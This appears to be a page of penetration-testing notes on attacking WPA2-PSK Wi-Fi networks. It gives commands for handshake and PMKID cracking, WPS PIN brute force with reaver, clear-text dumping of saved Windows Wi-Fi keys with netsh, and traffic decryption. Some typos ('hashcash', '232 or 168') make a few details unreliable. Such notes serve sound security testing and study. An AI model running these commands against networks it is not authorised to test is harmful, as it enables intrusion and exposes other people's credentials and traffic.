# Attacking WPA2 Pre-Shared Key Networks

### Dictionary-Based Attacks

**Cowpatty** - Audits WPA2-PSK for weak PSK

* Slow/time consuming

![](<../../../.gitbook/assets/image (36) (1).png>)

**aircrack-ng** (wpa/wpa2 psk dictionary attack)

```
aircrack-ng -w <wordlist> <pcap filename>
```

![](<../../../.gitbook/assets/image (59) (1).png>)

![](<../../../.gitbook/assets/image (64).png>)

**Hashcat**

*   Requires hccapx file

    * Generated with **cap2hccapx**

    ```
    hashcash -m 16800 -a3 -w3 handshakes.pmkid '?d?d?d?d?d?d?d'
    ```

    ###

#### Hashcat Mask Attack

* Brute force a custom range of PSK values
* Can mix and match static values with brute force character set values
* Default MiFi Password : 8 Hex characters
  * 232 or 168 = 4.2 billion entries / about 90 minutes at 90K PSK/second

![](<../../../.gitbook/assets/image (43) (1) (1).png>)

### PMKID Attack

![](<../../../.gitbook/assets/image (53).png>)

![](<../../../.gitbook/assets/image (42).png>)

```
sudo bettercap -iface wlan0

wlan0 >> wifi.recon on
wlan0 >> wifi.show

wlan0 >> wifi.assoc all

//convert pcap
hcxpcaptool -z handshakes.pmkid handshakes.pcap

//crack pmkid
hashcash -m 16800 -a3 -w3 handshakes.pmkid '?d?d?d?d?d?d?d'
```

### WPS PIN Attack

BruteForce

* WPS check the first 4 bytes, if the first part is wrong, the PIN is rejected.
* Doesn't require capturing pairing session or any interaction with AP
* Last byte is a checksum
  * 11,000 total WPS PINs

Active attack Tool **: Reaver**

```
reaver -i mon0 -b <BSSID MAC> -vv
```

Detecting WPS

* Wireshark filter: **wps.wifi**_**protected**_**setup\_state eq 0x02**

Passive Attack Tool**:** [**reaver-wps-fork-t6x**](https://github.com/t6x/reaver-wps-fork-t6x)****

* Observes DH exchange data
* &#x20;**https://github.com/t6x/reaver-wps-fork-t6x**&#x20;
* Outputs data to be used in **pixiewps (**[**https://github.com/wiire-a/pixiewps**](https://github.com/wiire-a/pixiewps)**)**

### Dump PNL pre-shared key

```
netsh wlan show profiles name='Profile Name' key=clear
```

### Decrypt WPA2 traffic dump

* Capture needs to include 4-way handshake
* You must also know the:
  * pre-shared key
  * SSID
  * this is because the PTK must be generated since it is different for each client

```
airdecap-ng -p <pre-shared key> -e <SSID> <packetdump>.dump
```

### KRACK attack (Key re-installation attack)

{% embed url="https://www.krackattacks.com" %}

* Captures and replaying step 3

### KR00K Attack

* r00kie-kr00kie.py - Automated Kr00k attack or examination of pcap files to see if we ever captured the necessary material for a Kr00k attack.

![](<../../../.gitbook/assets/image (49) (1).png>)

![](<../../../.gitbook/assets/image (74).png>)

![](<../../../.gitbook/assets/image (72).png>)

{% embed url="https://www.welivesecurity.com/wp-content/uploads/2020/02/ESET_Kr00k.pdf" %}
